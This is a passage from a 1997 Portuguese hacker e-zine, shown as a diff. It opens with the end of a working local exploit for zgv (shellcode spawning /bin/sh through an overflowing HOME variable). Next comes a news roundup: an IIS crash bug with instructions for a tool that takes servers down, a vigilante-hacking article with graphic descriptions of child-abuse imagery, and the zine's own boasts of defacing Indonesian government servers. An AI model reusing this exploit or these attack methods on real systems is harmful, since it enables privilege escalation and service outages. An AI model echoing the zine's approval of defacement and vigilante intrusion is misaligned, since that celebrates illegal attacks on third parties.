+  "\xff\xd4\x31\xc0\x99\x89\xcf\xb0\x2e\x40\xae\x75\xfd\x89\x39\x89\x51\x04"
+  "\x89\xfb\x40\xae\x75\xfd\x88\x57\xff\xb0\x0b\xcd\x80\x31\xc0\x40\x31\xdb"
+  "\xcd\x80/"
+  "/bin/sh"
+  "0";
+
+char *get_sp() {
+   asm("movl %esp,%eax");
+}
+
+#define bufsize 4096
+char buffer[bufsize];
+
+main() {
+  int i;
+
+  for (i = 0; i < bufsize - 4; i += 4)
+    *(char **)&buffer[i] = get_sp() -4675;
+
+  memset(buffer, 0x90, 512);
+  memcpy(&buffer[512], shellcode, strlen(shellcode));
+
+  buffer[bufsize - 1] = 0;
+
+  setenv("HOME", buffer, 1);
+
+  execl("/usr/bin/zgv", "/usr/bin/zgv", NULL);
+}
+
+
+---8<----------------8<---
+
+
+********************************************************************************
+
+
+Noticias
+---------
+compilado por secretos
+
+
+>> 3 de Junho de 1997<<
+
+IN: RECORTES - 03/Julho/1997
+
+HACKER OU FALHA DE HARDWARE MANDA A TELEPAC ABAIXO DURANTE 3 DIAS? 
+        Durante quase 3 dias, o serviço de email do maior ISP Português esteve
+inoperacional devido a um "presumível ataque de spamming" - tal como
+aparece no site do operador. Assumi-nos que a Telepac se estará a referir
+a mail-bombing, ou seja, envio continuado de largos volumes de email até
+conseguir "entupir" o server de mail. Mas só isso não explica que o
+sistema estivesse em baixo o tempo todo para reposição de mais 20GB de
+informação, mesmo tendo em conta que o equipamento é "considerado
+completamente redundante [...] a nível de discos, fonte de alimentação e
+controladores". Daí que a afirmação oficial da firma nos levante algumas
+suspeitas: ou algo de muito grave aconteceu no hardware e os backups não
+estavam 100% operacionais ou algum hacker conseguiu penetrar no sistema e
+fazer estragos de grande monta. Este acontecimento quase deixou passar
+despercebido o facto da Telepac ter instituído o número nacional único
+para acesso à Internet permitindo sempre pagar chamada local em qualquer
+ponto do País.
+
+--------------------
+
+>>21 de Junho de 1997<<
+
+IN: BUGTRAQ 21 Jun 1997 12:02:51 -0500
+
+From: Aleph One <aleph1@DFW.NET>
+Subject: http://www.eden.com/~tfast/jihad.html
+To: BUGTRAQ@NETSPACE.ORG 
+                   CyberJihad
+              The Microsoft IIS Bug
+My chronicle of finding a most embarrassing bug
+                 by Todd Fast
+      ________________________________________________________ 
+The Story
+My name is Todd Fast, and I found a bug today. I found it while trying to
+determine the maximum length of a URL Microsoft's Internet Information Server
+(IIS) would accept without an error. This website is dedicated to this bug and 
+my chronicle of it. 
+In case you haven't heard the details, there's a bug in Microsoft's Internet
+Information Server on Windows NT (and possibly other platforms) that allows a
+remote user--any user--to shut down the web server, and consequently the web
+site, using nothing more than a web browser. 
+This is a hugely embarrassing bug for Microsoft in my opinion, particularly 
+since they've just been lauded for pulling ahead of Netscape in Web server 
+market.
+Knowing that anyone with a grudge and a twitchy keyboard could shut down any
+of their customer's web sites must bear horribly on their collective conscience.
+(Ask yourself, was that sarcasm?) 
+
+The Bug 
+I know you can't wait to know more, so here are the nitty-gritty details on the
+actual bug, from the original message I sent to InfoWorld: 
+I've found a severe bug that allows any remote user on the Internet to halt web
+services on an Microsoft NT 4.0 server running Microsoft's Internet Information
+Server version 3. This bug appears to unaffected by the installation of Service
+Pack 3. 
+Let me explain the details of the bug and how I came across it. The bug surfaces
+when a remote user requests a Web URL from the IIS server that contains a
+certain number of characters (I'll call this number the "bug threshold") and is 
+of the following form: 
+   http:///?something=XXXXXXXX... 
+To cause the fatal error, this URL should contain a CGI name/value pair of a
+certain length. Note that the user does not have to request any specific 
+document: the error occurs because of the length of the URL alone. 
+Apparently, this bug
+only appears when using Netscape Navigator to contact the server because
+Internet Explorer won't allow such a long URL to be sent. 
+The length of the URL required to cause a crash is specific to each server, but
+seems to hover around 8K. Finding the correct length to kill an IIS server 
+requires trial and error. I've found that URLs above the bug threshold return 
+a "404 Object Not Found" or similar error. Below the threshold, the requested 
+page loads properly. However, sending a URL who's length is exactly the bug 
+threshold causes the server to stop responding. 
+When a user sends this URL to an IIS web server, it causes an access violation 
+in the INETINFO.EXE process. We don't know what this small 8k process's role is
+in the server's operation, but when it fails, it causes the WWW service under 
+IIS to stop. The site administrator must then clear the error and restart the 
+service to continue operation. The bug does not always appear upon the first 
+document request, but repeated application will eventually cause INETINFO.EXE 
+to fail. 
+A colleague, Bill Chaison, has studied the Dr. Watson log file and offers more
+information on the location of the error in the INETINFO.EXE process: 
+"This particular GPF occurred at 0x77A07614 on our server. The offending
+application is INETINFO.EXE, one of IIS 3.0's components. The stamp
+properties of our EXE are DATE=08/09/96, TIME=01:30a, SIZE=7440 bytes.
+Referencing the dump, thread ID 0xF9 performed a string compare function
+which caused a read fault during an iteration of the CMPSB (compare string byte
+by byte) opcode. This opcode works off of ESI and EDI as its base pointers and
+ECX as its loop repeater. I suspect that either ECX was either miscalculated to
+begin with, or ESI or EDI went out of range and caused a protection exception.
+The Watson error dialog reflected 0x77A07614 as the CS:EIP of the fault when
+the message box popped up. The log file below confirms the address of the error.
+Search the file for "FAULT ->" to jump to its description." 
+See the attached file IISCRASH.TXT file for the stack dump. 
+I discovered the bug while trying to determine the maximum length of the URL
+IIS would accept. While doing so, I found that our in-house server stopped
+responding. Not realizing that this was a bug that affected all copies of IIS, 
+I continued my investigation using Microsoft's site, www.microsoft.com, and
+inadvertently shut down their web server as well. At this point I realized that 
+the error was indeed a bug that affected IIS itself. 
+To my knowledge, this bug has never been exploited or been used to crash or
+deny service from any web site. However, just because I spoke up about it
+doesn't mean that someone else hasn't already found or been using it. All you
+webmasters out there using IIS, have you had any strange crashes lately? 
+
+Are you a CyberTerrorist? 
+If so, please don't start your own CyberJihad by downloading the following
+program and easily reproducing this bug on any number of IIS servers all over the
+Internet. The Internet Worm was bad enough, and that is not my intent. 
+I'm making this program available so that those of you running IIS can more
+easily assess your web server's vulnerability and whether this bug would do
+anything more than deny your customers service (as if that's not bad enough). 
+Remember this program doesn't do anything special or sneaky, it just makes the
+job of finding the already-existing bug on a particular server somewhat easier. It
+does nothing that someone couldn't do in about 5 minutes with a browser
+anyway, so please, no hate mail from webmasters for making it available. Instead,
+blame Microsoft's bug.
+
+
+Here are the details: 
+I created a small Java program, called IIServerSlayer, that repeatedly hits a web
+server with a varying length URL until the web server stops responding due to the
+IIS bug. To run the program, first ensure that you have Java 1.0.2 installed on
+your machine and running properly. Put the IIServerSlayer.class file in a directory
+and open a command window located at that directory. Use the following
+command line: 
+    java -classpath .;%classpath% IIServerSlayer 
+We use a starting URL length of between 8200 and 8300 to crash our server, but
+one of our servers crashed in a much lower range of around 4000 bytes. Trial and
+error is the only way to determine the threshold and I suggest starting at a length
+of 8300. Also, don't use http:// in front of the server name; the program does that
+for you. 
+One of the things to note about the program is that it can't really detect if the web
+request is being served properly. Because the bug doesn't always surface on the
+first document request with the problematic URL, the program only decrements
+the length counter if an error occurs, but assumes that server is about to crash if
+an error doesn't occur and the counter has remained the same. This means that if
+you start the program and don't see a series of lines like the following: 
+Trying length xxxx...Done Trying length xxxx...Done Trying length xxxx...Done ...
+and instead see this: 
+Almost dead! Retrying length xxxx...Done Almost dead! Retrying length
+xxxx...Done Almost dead! Retrying length xxxx...Done 
+you have started with too low a URL length and need to Ctrl-C the program and
+restart it with a higher length. When the program pauses for more than a few
+seconds on a particular statement, you can be sure that the web server has died.
+When you go to the web server and clear the error, IIServerSlayer detects that
+the error occurred and gives you a message stating so. 
+Download a copy of IIServerSlayer for personal, non-malicious use 
+
+Chronicle 
+Because the Internet's relevance to our existence is access to timely information,
+I'm posting the chronicle of my experience with this bug below in as close to real
+time as I can. I don't know whether it will turn out interesting or not, but there's
+no way to tell until I try it. 
+
+6-19-97
+3:30 PM CST I contact News Editor Michael Parsons at the trade publication
+InfoWorld and tell him a strange story of a bug I've found in IIS that allows any
+remote user to shut down an IIS web server. Michael sounds keenly interested
+and I promise to send him additional information and the program I've written to
+reproduce the bug shortly. About 20 minutes later I send the email. 
+6-19-97
+4:45 PM CST Jon P. at Microsoft calls to ask about the nature of the bug. He
+sounds nervous to me and wants to get straight to the point. I tell him that I'll
+send along the email I sent to InfoWorld along with the program. He sounds
+skeptical, but accepts. He seems to think that this is probably a bug Microsoft has
+already addressed in a service pack or a hotfix. I'm not so sure. Let's wait and see. 
+6-19-97
+5:15 PM CST Maggie Biggs at InfoWorld calls to ask some additional questions
+about the bug for an upcoming news release. She says she's been able to
+reproduce the bug and wonders how it may affect other web services in IIS like
+FTP. I agree to send my program to her so she can use it to reproduce the
+problem. She's very friendly and helpful. 
+6-19-97
+5:40 PM CST Maggie Biggs at InfoWorld emails to tell me she's reproduced the
+problem on her test machines and will be assessing the bug related to other World
+Wide Web services under IIS. She's stated that one of her test machines crashed
+altogether, a situation she's called "potentially...quite serious". 
+6-19-97
+5:55 PM CST News is spreading like wildfire. Another journalist at InfoWorld in
+Seattle calls and interviews me on the phone about the nature of the bug. He asks
+if the bug would occur during normal usage of the server and I said it probably
+would not due to the length of the string. 
+
+More Info? 
+As more information on this problem comes to light, I'll post it here. Keep coming
+back to check out the latest news. 
+
+What's with the name? 
+I named this website after the title of this message from an old friend, upon
+hearing the news: 
+"You're walking the fine line between info-terrorist and "just another guy looking
+to help mankind". Here's a tip: if you'd like to be labeled info-terrorist, send an
+e-mail to Microsoft like those Danish guys that found the Netscape security flaw.
+I think the e-mail actually said, "OK, where's the guy with the checkbook". Then
+you could adopt some crazy online name like 'LordChaos' or 'DethKing' like
+those Undernet software pirates do. 
+"P.S. If this blows up and I get interviewed, you can count on me saying all kinds
+of awful stuff: 'He was a loner. He read Soldier of Fortune a whole lot.' Then I'd
+throw in a curveball to make people really wonder: 'He would get really upset
+whenever 'The Tick' episode was a rerun and would launch a new computer
+virus". 
+I promise it's not all true. 
+
+Parting Words 
+A colleague had the good sense to remind of something I'd almost forgotten
+before today: 
+You get what you pay for 
+Copyright C 1997 by Todd Fast. All rights reserved.
+Contact the author, Todd Fast, at tfast@eden.com 
+
+--------------------
+
+>>18 de Junho de 1997<<
+
+IN: Cu Digest, #9.47, Wed 18 Jun 97
+
+Date: Sun, 15 Jun 1997 14:17:01 -0700 (PDT)
+From: Jim Thomas <jthomas@well.com>
+Subject: File 5-- Hacker Vows 'Terror' for Child Pornographers
+
+Hacker Vows 'Terror' for Child Pornographers
+by Steve Silberman
+Source - WIRED News
+http://www.wired.com/news/culture/story/4437.html Copyright 1993-97 Wired
+Ventures, Inc. and affiliated companies 
+
+After 17 years in the hacker underground, Christian Valor - well known among
+old-school hackers and phone phreaks as "Se7en" - was convinced that most of
+what gets written in the papers about computers and hacking is sensationalistic
+jive. For years, Valor says, he sneered at reports of the incidence of child
+pornography on the Net as "exaggerated/over-hyped/fearmongered/bullshit."
+Now making his living as a lecturer on computer security, Se7en claims he
+combed the Net for child pornography for eight weeks last year without finding a
+single image. 
+That changed a couple of weeks ago, he says, when a JPEG mailed by an
+anonymous prankster sent him on an odyssey through a different kind of
+underground: IRC chat rooms with names like #littlegirlsex, ftp directories
+crammed with filenames like 6yoanal.jpg and 8&dad.jpg, and newsgroups like
+alt.binaries.pictures.erotica.pre-teen. The anonymous file, he says, contained a
+"very graphic" image of a girl "no older than 4 years old." 
+On 8 June, Se7en vowed on a hacker's mailing list to deliver a dose of "genuine
+hacker terror" to those who upload and distribute such images on the Net. The
+debate over his methods has stirred up tough questions among his peers about
+civil liberties, property rights, and the ethics of vigilante justice. 
+
+A declaration of war 
+What Se7en tapped into, he says, was a "very paranoid" network of traders of
+preteen erotica. In his declaration of "public war" - posted to a mailing list devoted
+to an annual hacker's convention called DefCon - Se7en explains that the protocol
+on most child-porn servers is to upload selections from your own stash, in
+exchange for credits for more images. 
+What he saw on those servers made him physically sick, he says. "For someone
+who took a virtual tour of the kiddie-porn world for only one day," he writes, "I
+had the opportunity to fully max out an Iomega 100-MB Zip disc." 
+Se7en's plan to "eradicate" child-porn traders from the Net is "advocating
+malicious, destructive hacking against these people." He has enlisted the expertise
+of two fellow hackers for the first wave of attacks, which are under way. 
+Se7en feels confident that legal authorities will look the other way when the
+victims of hacks are child pornographers - and he claims that a Secret Service
+agent told him so explicitly. Referring to a command to wipe out a hard drive by
+remote access, Se7en boasted, "Who are they going to run to? The police? 'They
+hacked my kiddie-porn server and rm -rf'd my computer!' Right." 
+Se7en claims to have already "taken down" a "major player" - an employee of
+Southwestern Bell who Se7en says was "posting ads all over the place." Se7en
+told Wired News that he covertly watched the man's activities for days, gathering
+evidence that he emailed to the president of Southwestern Bell. Pseudonymous
+remailers like hotmail.com and juno.com, Se7en insists, provide no security
+blanket for traders against hackers uncovering their true identities by cracking
+server logs. Se7en admits the process of gaining access to the logs is time
+consuming, however. Even with three hackers on the case, it "can take two or
+three days. We don't want to hit the wrong person." 
+A couple of days after submitting message headers and logs to the president and
+network administrators of Southwestern Bell, Se7en says, he got a letter saying
+the employee was "no longer on the payroll." 
+
+The hacker search for acceptance 
+Se7en's declaration of war received support on the original mailing list. "I am all
+for freedom of speech/expression," wrote one poster, "but there are some things
+that are just wrong.... I feel a certain moral obligation to the human race to do my
+part in cleaning up the evil." 
+Federal crackdowns targeting child pornographers are ineffective, many argued.
+In April, FBI director Louis Freeh testified to the Senate that the bureau operation
+dubbed "Innocent Images" had gathered the names of nearly 4,000 suspected
+child-porn traffickers into its database. Freeh admitted, however, that only 83 of
+those cases resulted in convictions. (The Washington Times reports that there
+have also been two suicides.) 
+The director's plan? Ask for more federal money to fight the "dark side of the
+Internet" - US$10 million. 
+Pitching in to assist the Feds just isn't the hacker way. As one poster to the
+DefCon list put it, "The government can't enforce laws on the Internet. We all
+know that. We can enforce laws on the Internet. We all know that too." 
+The DefCon list was not a unanimous chorus of praise for Se7en's plan to give
+the pornographers a taste of hacker terror, however. The most vocal dissenter has
+been Declan McCullagh, Washington correspondent for the Netly News.
+McCullagh is an outspoken champion of constitutional rights, and a former hacker
+himself. He says he was disturbed by hackers on the list affirming the validity of
+laws against child porn that he condemns as blatantly unconstitutional. 
+"Few people seem to realize that the long-standing federal child-porn law
+outlawed pictures of dancing girls wearing leotards," McCullagh wrote - alluding
+to the conviction of Stephen Knox, a graduate student sentenced to five years in
+prison for possession of three videotapes of young girls in bathing suits. The
+camera, the US attorney general pointed out, lingered on the girls' genitals, though
+they remained clothed. "The sexual implications of certain modes of dress,
+posture, or movement may readily put the genitals on exhibition in a lascivious
+manner, without revealing them in a nude display," the Feds argued - and won. 
+It's decisions like Knox v. US, and a law criminalizing completely synthetic digital
+images "presented as" child porn, McCullagh says, that are making the definition
+of child pornography unacceptably broad: a "thought crime." 
+The menace of child porn is being exploited by "censor-happy" legislators to "rein
+in this unruly cyberspace," McCullagh says. The rush to revile child porn on the
+DefCon list, McCullagh told Wired News, reminded him of the "loyalty oaths" of
+the McCarthy era. 
+"These are hackers in need of social acceptance," he says. "They've been
+marginalized for so long, they want to be embraced for stamping out a social
+evil." McCullagh knows his position is a difficult one to put across to an audience
+of hackers. In arguing that hackers respect the property rights of pornographers,
+and ponder the constitutionality of the laws they're affirming, McCullagh says,
+"I'm trying to convince hackers to respect the rule of law, when hacking systems
+is the opposite of that." 
+But McCullagh is not alone. As the debate over Se7en's declaration spread to the
+cypherpunks mailing list and alt.cypherpunks - frequented by an older crowd than
+the DefCon list - others expressed similar reservations over Se7en's plan. 
+"Basically, we're talking about a Dirty Harry attitude," one network
+technician/cypherpunk told Wired News. Though he senses "real feeling" behind
+Se7en's battle cry, he feels that the best way to deal with pornographers is to
+"turn the police loose on them." Another participant in the discussion says that
+while he condemns child porn as "terrible, intrinsically a crime against innocence,"
+he questions the effectiveness of Se7en's strategy. 
+"Killing their computer isn't going to do anything," he says, cautioning that the
+vigilante approach could be taken up by others. "What happens if you have
+somebody who doesn't like abortion? At what point are you supposed to be
+enforcing your personal beliefs?" 
+
+Raising the paranoia level 
+Se7en's loathing for aficionados of newsgroups like alt.sex.pedophilia.swaps runs
+deeper than "belief." "I myself was abused when I was a kid," Se7en told Wired
+News. "Luckily, I wasn't a victim of child pornography, but I know what these
+kids are going through." 
+With just a few hackers working independently to crack server logs, sniff IP
+addresses, and sound the alarm to network administrators, he says, "We can take
+out one or two people a week ... and get the paranoia level up," so that "casual
+traders" will be frightened away from IRC rooms like
+"#100%preteensexfuckpics." 
+It's not JPEGs of clothed ballerinas that raise his ire, Se7en says. It's "the
+4-year-olds being raped, the 6-year-old forced to have oral sex with cum running
+down themselves." Such images, Se7en admits, are very rare - even in online
+spaces dedicated to trading sexual imagery of children. 
+"I know what I'm doing is wrong. I'm trampling on the rights of these guys," he
+says. "But somewhere in the chain, someone is putting these images on paper
+before they get uploaded. Your freedom ends when you start hurting other
+people." 
+
+Copyright 1993-97 Wired Ventures, Inc. and affiliated companies 
+
+--------------------
+
+>>12 de Junho de 1997<<
+
+IN: BUGTRAQ 12 Jun 97 21:56:53 CDT
+
+From: Aleph One aleph1@DFW.NET
+Subject: Resent mail....
+
+Netscape NEW YORK (CNNfn) - A serious new flaw that affects all versions of
+Netscape Communications Corp.'s popular Navigator Internet browser software --
+including the final test version of its Communicator Suite released Wednesday --
+has been uncovered by a Danish software firm, CNNfn has learned.
+The bug was reported by Cabocomm, a software company located about 100
+miles west of Copenhagen, Denmark. The bug makes it possible for Web-site
+operators to read anything stored on the hard drive of a PC logged on to the Web
+site.
+After the firm reported the bug to CNN Financial News, CNNfn and PC
+Magazine tested the bug by creating and storing a document on a PC's hard drive
+in New York. Seconds later, the Danish company read it.
+As further proof, CNNfn and PC Magazine created another document which the
+Danish company was also able to read.
+Larry Seltzer, technical director of PC Labs, was among those who helped verify
+the bug report. He said it would take a somewhat savvy computer user to exploit
+the bug.
+"They have to be seeking information from your system and they also have to
+know the file name. It's not that hard for somebody who's looking to make
+trouble, but they do have to be looking for it," Seltzer said.
+"It's serious in that it's in the [actual] browser ...whereas previous bugs generally
+required the user to have downloaded an additional product," Jim Wise, UNIX
+administrator for CNNfn, said.
+CNNfn's test showed that Internet security firewalls offer no protection from the
+bug.
+Mike Homer, vice president of marketing for Netscape, said the company takes
+this and all bug reports seriously. (83K WAV) or (83K AIFF)
+The Danish company says the reward of $1,000 and a T-shirt is "insultingly low"
+considering the extent to which the bug report is likely to worry Netscape users.
+Cabocomm said it would accept "reasonable compensation" for the technical
+information -- or they can send a Netscape representative to Cabocomm and get it
+for free.
+CNNfn, PC Magazine and the Danish company will not release technical details
+on the bug until Netscape has prepared a bug fix.
+The reason CNNfn is not reporting the specifics of the bug is to avoid anyone
+exploiting it.
+Until the bug is fixed, confidential letters, business spreadsheets -- everything on
+your PC -- can potentially be pilfered.
+The Danish company says it won't exploit the bug, but has no idea if someone
+else has found the same bug and is compromising a system's integrity.
+
+--------------------
+
+>>5 de Junho de 1997<<
+
+O server www.inn.bppt.go.id foi hackado pela KaotiK Team! 
+Mais informações em : http://kaotik.home.ml.org/timor/bppt1.html
+
+--------------------
+
+>>2 de Junho de 1997<<
+
+IN: Cu Digest, #9.44, Tue 10 Jun 97
+
+Date: Wed, 04 Jun 1997 22:32:06 -0400
+From: "Evian S. Sim" 
+Subject: File 2--NASA Nabs Teen Computer Hacker
+
+.c The Associated Press
+Monday, June 2, 1997
+
+WASHINGTON (AP) - A Delaware teen-ager who hacked his way into a NASA
+web site on the Internet and left a message berating U.S. officials is being
+investigated by federal authorities, agency officials said Monday.
+NASA Inspector General Robert Gross cited the incident - the most recent
+example of a computer invasion of a NASA web site - as an example of how the
+space agency has become ``vulnerable via the Internet.''
+"We live in an information environment vastly different than 20 years ago," Gross
+said in a written statement. "Hackers are increasing in number and in frequency of
+attack."
+In the latest case, the Delaware teen, whose name, age and hometown were not
+released, altered the Internet web site for the Marshall Space Flight Center in
+Huntsville, Ala., according to the statement from the computer crimes division of
+NASA's Inspector General Office.
+"We own you. Oh, what a tangled web we weave, when we practice to deceive,"
+the teen's message said, adding that the government systems administrators who
+manage the site were "extremely stupid."
+The message also encouraged sympathizers of Kevin Mitnick, a notorious
+computer hacker, to respond to the site. Mitnick was indicted last year on charges
+stemming from a multimillion-dollar crime wave in cyberspace.
+The altered message was noticed by the computer security team in Huntsville but
+the NASA statement did not mention how long the message was available to the
+public or exactly when it was discovered. NASA officials weren't made available
+to answer questions about the event.
+In the statement, NASA called the teen's hacking "a cracking spree" and said it
+was stopped May 26 when his personal computer was seized.
+Prosecutors from the U.S. Attorney's office in Delaware and Alabama are
+handling the case with NASA's computer crimes division.
+Last March, cyberspace invaders made their way into another NASA web site
+and threatened an electronic terrorist attack against corporate America. The
+group, which called itself ``H4G1S'' in one message and ``HAGIS'' in another,
+also called for some well-known hackers to be released from jail.
+Engineers at the Goddard Space Flight Center in Greenbelt, Md., quickly noticed
+the change and took the page off the Internet within 30 minutes. NASA officials
+said the agency installed electronic security measures designed to prevent a
+recurrence. 
+
+--------------------
+
+>>29 de Maio de 1997<<
+
+O server www.sdn.or.id foi hackado pela KaotiK Team! 
+Mais informações em : http://kaotik.home.ml.org/timor/bppt1.html
+
+-------------------
+
+********************************************************************************
+
+
+Correio
+--------
+
+A maioria do mail que recebemos até agora foi algo parecido com:
+
+"Eu gostava de colaborar na zine, mas não sei o que poderei fazer" 
+
+RESPOSTA:
+by secretos
+
+Podem fazer imensas coisas!! Vou só deixar algumas ideias:
+
+     - escrever um texto sobre um determinado assunto relacionado com hacking, 
+        redes ou computadores em geral; 
+
+     - traduzir um texto que acham que está bem elaborado e que podia servir 
+        como ponto de referencia; 
+
+     - mandar exploits novos para a gente os publicar; 
+
+     - explicar um determinado programa; 
+
+     - explicar um determinado bug; 
+
+     - responder às perguntas levantadas nesta secção pelos leitores; 
+
+     - enviar críticas e opiniões; 
+
+     - etc... 
+
+Não tenham medo de escreverem algo que pensam que já toda a gente sabe. 
+Não tenham medo de ser chamados lamers... mais lamers são aqueles que só sabem 
+criticar!! 
+
+Contamos com a vossa ajuda. 
+
+********************************************************************************
+ 
+
+Conclusão
+-----------------
+by secretos 
+
+Ok, este foi o número 0 da .pt zine. Espero que gostem. Mas se não gostaram 
+façam melhor, não se limitem a criticar... Dizer mal dos outros é fácil! 
+
+Este número foi só um teste, queremos ver a reacção das pessoas. 
+
+Esperemos que esta zine dure longos anos... 
+
+Não fazemos a mínima ideia de como será o número 1 da .pt zine... Agora vamos 
+de férias e depois a gente pensa nisso... 
+Também não fazemos a mínima ideia de quando sairá o número 1 da .pt zine... 
+Estejam atentos. 
+
+Para próximo número da zine esperamos que vocês participem mais. 
+
+
+********************************************************************************
+
+Agradecimentos
+----------------
+
+Neste número 0 da .pt zine queremos agradecer a todos aqueles que nos apoiaram: 
+
+        - A todos os membros da KaotiK Team (http://kaotik.home.ml.org), sem eles 
+        esta zine não teria nascido 
+
+        - Ao Elektro (elektro@null.net), pelos textos e pela força de vontade. 
+
+        - Ao secretos (secretos@hotmail.com), pelos textos e pelo design e HTML 
+        da zine. 
+
+     - A mais ninguém!! Mais ninguém ajudou!!!!! :-(( 
+
+********************************************************************************
+********************************************************************************
